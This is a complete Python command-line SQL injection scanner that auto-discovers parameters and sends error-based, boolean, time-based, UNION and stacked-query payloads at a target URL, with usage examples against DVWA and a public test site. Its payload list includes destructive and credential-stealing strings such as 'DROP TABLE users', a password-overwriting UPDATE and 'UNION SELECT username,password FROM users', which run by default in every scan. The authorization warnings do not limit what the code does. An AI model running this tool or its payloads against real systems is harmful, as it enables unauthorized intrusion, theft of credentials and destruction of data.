#!/usr/bin/env python3
"""
SQL Injection Scanner
Author: Security Research Tool
License: MIT
WARNING: Use only on systems you own or have explicit written permission to test.
"""

import argparse
import asyncio
import json
import logging
import re
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Optional
from urllib.parse import urlencode, urlparse, urljoin

import aiohttp
from aiohttp import ClientTimeout

# ──────────────────────────────────────────────
# Logging setup
# ──────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("sqli_scan.log"),
    ],
)
logger = logging.getLogger(__name__)

# ──────────────────────────────────────────────
# SQL Injection Payloads
# ──────────────────────────────────────────────
PAYLOADS = {
    "error_based": [
        "'",
        "''",
        "`",
        "``",
        ",",
        '"',
        "\\",
        "1'",
        "1''",
        "1`",
        "1,",
        '1"',
        "1 AND 1=1",
        "1 AND 1=2",
        "' OR '1'='1",
        "' OR '1'='2",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' having 1=1--",
        "' group by columnnames having 1=1--",
        "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--",
    ],
    "boolean_based": [
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "1 OR 1=1",
        "1 OR 1=2",
        "' OR 1=1--",
        "' OR 1=2--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "' OR SLEEP(5)--",
        "1 OR SLEEP(5)",
        "'; SELECT pg_sleep(5)--",
        "1; SELECT pg_sleep(5)--",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "1 UNION SELECT 1,2,3",
        "' UNION SELECT username,password FROM users--",
    ],
    "stacked_queries": [
        "'; DROP TABLE users--",
        "1; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','hacked')--",
        "'; UPDATE users SET password='hacked' WHERE '1'='1'--",
    ],
}

# ──────────────────────────────────────────────
# Error signatures that indicate SQLi vulnerability
# ──────────────────────────────────────────────
ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"mysql_fetch",
    r"mysql_num_rows",
    r"mysql_query",
    r"unclosed quotation mark after the character string",
    # PostgreSQL
    r"pg_query\(\)",
    r"pg_exec\(\)",
    r"postgresql.*error",
    r"warning.*pg_",
    r"valid postgresql result",
    r"npgsql\.",
    # MSSQL
    r"microsoft sql server",
    r"odbc sql server driver",
    r"sqlserver jdbc driver",
    r"mssql_query\(\)",
    r"odbc microsoft access driver",
    r"\[microsoft\]\[odbc",
    r"sqlexception",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    r"oracle.*driver",
    r"warning.*oci_",
    r"warning.*ora-",
    # SQLite
    r"sqlite_exception",
    r"sqlite error",
    r"sqlite3::",
    r"system.data.sqlite.sqliteexception",
    # Generic
    r"syntax error",
    r"sql command not properly ended",
    r"unexpected end of sql command",
    r"quoted string not properly terminated",
    r"sql syntax.*mysql",
    r"warning.*mssql",
    r"valid mysql result",
    r"check the manual that corresponds to your (mysql|mariadb) server version",
]

COMPILED_SIGNATURES = [re.compile(sig, re.IGNORECASE) for sig in ERROR_SIGNATURES]


# ──────────────────────────────────────────────
# Data Classes
# ──────────────────────────────────────────────
@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    payload_type: str
    vulnerable: bool
    evidence: str
    response_code: int
    response_time: float
    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())


@dataclass
class ScanReport:
    target: str
    scan_start: str
    scan_end: str
    total_requests: int
    vulnerable_count: int
    findings: list


# ──────────────────────────────────────────────
# Core Scanner
# ──────────────────────────────────────────────
class SQLInjectionScanner:
    def __init__(
        self,
        target_url: str,
        params: Optional[list] = None,
        concurrency: int = 5,
        rate_limit: float = 0.5,
        timeout: int = 10,
        payload_types: Optional[list] = None,
        cookies: Optional[str] = None,
        headers: Optional[dict] = None,
        output_file: Optional[str] = None,
    ):
        self.target_url = target_url.rstrip("/")
        self.params = params or []
        self.semaphore = asyncio.Semaphore(concurrency)
        self.rate_limit = rate_limit
        self.timeout = ClientTimeout(total=timeout + 6)  # extra buffer for time-based
        self.payload_types = payload_types or list(PAYLOADS.keys())
        self.cookies = self._parse_cookies(cookies)
        self.headers = {
            "User-Agent": "SQLiScanner/1.0 (Security Research)",
            **(headers or {}),
        }
        self.output_file = output_file
        self.results: list[ScanResult] = []
        self.total_requests = 0
        self._baseline_response: Optional[str] = None
        self._baseline_length: int = 0

    def _parse_cookies(self, cookie_str: Optional[str]) -> dict:
        if not cookie_str:
            return {}
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
        return cookies

    async def _fetch(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: dict,
        method: str = "GET",
    ) -> tuple[int, str, float]:
        start = time.time()
        try:
            if method.upper() == "POST":
                resp = await session.post(
                    url,
                    data=params,
                    timeout=self.timeout,
                    ssl=False,
                )
            else:
                resp = await session.get(
                    url,
                    params=params,
                    timeout=self.timeout,
                    ssl=False,
                )
            text = await resp.text(errors="replace")
            elapsed = time.time() - start
            return resp.status, text, elapsed
        except asyncio.TimeoutError:
            elapsed = time.time() - start
            return 0, "TIMEOUT", elapsed
        except Exception as e:
            elapsed = time.time() - start
            logger.debug(f"Request error: {e}")
            return 0, str(e), elapsed

    async def _get_baseline(self, session: aiohttp.ClientSession, param: str):
        """Get a baseline response for comparison (boolean-based detection)."""
        base_params = {param: "1"}
        _, text, _ = await self._fetch(session, self.target_url, base_params)
        self._baseline_response = text
        self._baseline_length = len(text)

    def _detect_error(self, response_body: str) -> tuple[bool, str]:
        for pattern in COMPILED_SIGNATURES:
            match = pattern.search(response_body)
            if match:
                snippet = response_body[max(0, match.start() - 30): match.end() + 30]
                snippet = snippet.replace("\n", " ").strip()
                return True, f"DB error signature: ...{snippet}..."
        return False, ""

    def _detect_time_based(self, elapsed: float, payload: str) -> tuple[bool, str]:
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper() or "pg_sleep" in payload:
            if elapsed >= 4.5:
                return True, f"Response delayed {elapsed:.2f}s (time-based blind SQLi)"
        return False, ""

    def _detect_boolean(
        self, response_body: str, response_code: int
    ) -> tuple[bool, str]:
        if self._baseline_response is None:
            return False, ""
        curr_len = len(response_body)
        diff = abs(curr_len - self._baseline_length)
        # Significant content difference could signal boolean-based SQLi
        if diff > 500 and self._baseline_length > 0:
            ratio = diff / max(self._baseline_length, 1)
            if ratio > 0.3:
                return (
                    True,
                    f"Content length changed significantly: baseline={self._baseline_length}, current={curr_len}",
                )
        return False, ""

    async def _test_payload(
        self,
        session: aiohttp.ClientSession,
        param: str,
        payload: str,
        payload_type: str,
        method: str = "GET",
    ):
        async with self.semaphore:
            await asyncio.sleep(self.rate_limit)
            test_params = {param: payload}
            status, body, elapsed = await self._fetch(
                session, self.target_url, test_params, method
            )
            self.total_requests += 1

            vulnerable = False
            evidence = ""

            # Error-based detection
            found, ev = self._detect_error(body)
            if found:
                vulnerable, evidence = True, ev

            # Time-based detection
            if not vulnerable and payload_type == "time_based":
                found, ev = self._detect_time_based(elapsed, payload)
                if found:
                    vulnerable, evidence = True, ev

            # Boolean-based detection (secondary signal)
            if not vulnerable and payload_type == "boolean_based":
                found, ev = self._detect_boolean(body, status)
                if found:
                    vulnerable, evidence = True, ev

            if vulnerable:
                result = ScanResult(
                    url=self.target_url,
                    parameter=param,
                    payload=payload,
                    payload_type=payload_type,
                    vulnerable=True,
                    evidence=evidence,
                    response_code=status,
                    response_time=round(elapsed, 3),
                )
                self.results.append(result)
                logger.warning(
                    f"[VULNERABLE] param={param!r} type={payload_type} payload={payload!r} | {evidence}"
                )
            else:
                logger.debug(
                    f"[safe] param={param!r} payload={payload!r} status={status} time={elapsed:.2f}s"
                )

    async def _discover_params(self, session: aiohttp.ClientSession) -> list[str]:
        """Try to discover GET parameters from the URL and basic form crawl."""
        parsed = urlparse(self.target_url)
        discovered = []

        # From URL query string
        if parsed.query:
            for part in parsed.query.split("&"):
                if "=" in part:
                    key = part.split("=")[0]
                    if key:
                        discovered.append(key)

        # Basic HTML form crawl
        try:
            _, body, _ = await self._fetch(session, self.target_url, {})
            for match in re.finditer(
                r'<input[^>]+name=["\']([^"\']+)["\']', body, re.IGNORECASE
            ):
                name = match.group(1)
                if name not in discovered:
                    discovered.append(name)
        except Exception:
            pass

        return discovered or ["id", "user", "username", "search", "q", "page"]

    async def scan(self):
        scan_start = datetime.utcnow().isoformat()
        logger.info("=" * 60)
        logger.info("  SQL INJECTION SCANNER — AUTHORIZED USE ONLY")
        logger.info("=" * 60)
        logger.info(f"Target : {self.target_url}")
        logger.info(f"Start  : {scan_start}")

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            headers=self.headers, cookies=self.cookies, connector=connector
        ) as session:

            # Discover params if none provided
            if not self.params:
                logger.info("No params specified — auto-discovering...")
                self.params = await self._discover_params(session)
                logger.info(f"Discovered params: {self.params}")

            tasks = []
            for param in self.params:
                await self._get_baseline(session, param)
                for ptype in self.payload_types:
                    for payload in PAYLOADS.get(ptype, []):
                        tasks.append(
                            self._test_payload(session, param, payload, ptype)
                        )

            logger.info(f"Queued {len(tasks)} tests across {len(self.params)} param(s)")
            await asyncio.gather(*tasks)

        scan_end = datetime.utcnow().isoformat()
        self._print_report(scan_start, scan_end)
        self._save_report(scan_start, scan_end)

    def _print_report(self, scan_start: str, scan_end: str):
        print("\n" + "=" * 60)
        print("  SCAN REPORT")
        print("=" * 60)
        print(f"  Target       : {self.target_url}")
        print(f"  Started      : {scan_start}")
        print(f"  Finished     : {scan_end}")
        print(f"  Total Reqs   : {self.total_requests}")
        print(f"  Vulnerable   : {len(self.results)}")
        print("=" * 60)

        if not self.results:
            print("  ✅  No SQL injection vulnerabilities detected.")
        else:
            print(f"  ⚠️   {len(self.results)} potential SQLi finding(s):\n")
            for i, r in enumerate(self.results, 1):
                print(f"  [{i}] Parameter : {r.parameter}")
                print(f"      Type      : {r.payload_type}")
                print(f"      Payload   : {r.payload}")
                print(f"      Evidence  : {r.evidence}")
                print(f"      HTTP      : {r.response_code}  ({r.response_time}s)")
                print()

    def _save_report(self, scan_start: str, scan_end: str):
        report = ScanReport(
            target=self.target_url,
            scan_start=scan_start,
            scan_end=scan_end,
            total_requests=self.total_requests,
            vulnerable_count=len(self.results),
            findings=[asdict(r) for r in self.results],
        )
        filename = self.output_file or f"sqli_report_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, "w") as f:
            json.dump(asdict(report), f, indent=2)
        logger.info(f"Report saved → {filename}")


# ──────────────────────────────────────────────
# CLI Entry Point
# ──────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="SQL Injection Scanner — authorized targets only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan DVWA (running locally)
  python sql_injection_scanner.py -u "http://localhost/dvwa/vulnerabilities/sqli/" \\
      -p id --cookie "PHPSESSID=abc123; security=low"

  # Scan with specific payload types and concurrency
  python sql_injection_scanner.py -u "http://localhost/app/search" \\
      -p q username --types error_based boolean_based -c 3 -r 1.0

  # Output to specific file
  python sql_injection_scanner.py -u "http://testphp.vulnweb.com/listproducts.php" \\
      -p cat -o my_report.json
        """,
    )
    p.add_argument("-u", "--url", required=True, help="Target URL")
    p.add_argument(
        "-p", "--params", nargs="*", default=[], help="GET/POST parameters to test"
    )
    p.add_argument(
        "--types",
        nargs="*",
        default=list(PAYLOADS.keys()),
        choices=list(PAYLOADS.keys()),
        help="Payload categories to use (default: all)",
    )
    p.add_argument(
        "-c", "--concurrency", type=int, default=5, help="Max concurrent requests (default: 5)"
    )
    p.add_argument(
        "-r", "--rate", type=float, default=0.5, help="Seconds between requests (default: 0.5)"
    )
    p.add_argument(
        "-t", "--timeout", type=int, default=10, help="HTTP timeout seconds (default: 10)"
    )
    p.add_argument("--cookie", type=str, help='Cookie string e.g. "session=abc; security=low"')
    p.add_argument("-o", "--output", type=str, help="Output JSON report filename")
    p.add_argument("-v", "--verbose", action="store_true", help="Enable debug logging")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    print("""
╔══════════════════════════════════════════════════════════╗
║           SQL INJECTION SCANNER v1.0                     ║
║  ⚠  FOR AUTHORIZED SECURITY TESTING ONLY ⚠              ║
║  Only use on systems you own or have written permission  ║
║  Unauthorized use is illegal and unethical              ║
╚══════════════════════════════════════════════════════════╝
""")

    scanner = SQLInjectionScanner(
        target_url=args.url,
        params=args.params,
        concurrency=args.concurrency,
        rate_limit=args.rate,
        timeout=args.timeout,
        payload_types=args.types,
        cookies=args.cookie,
        output_file=args.output,
    )

    try:
        asyncio.run(scanner.scan())
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()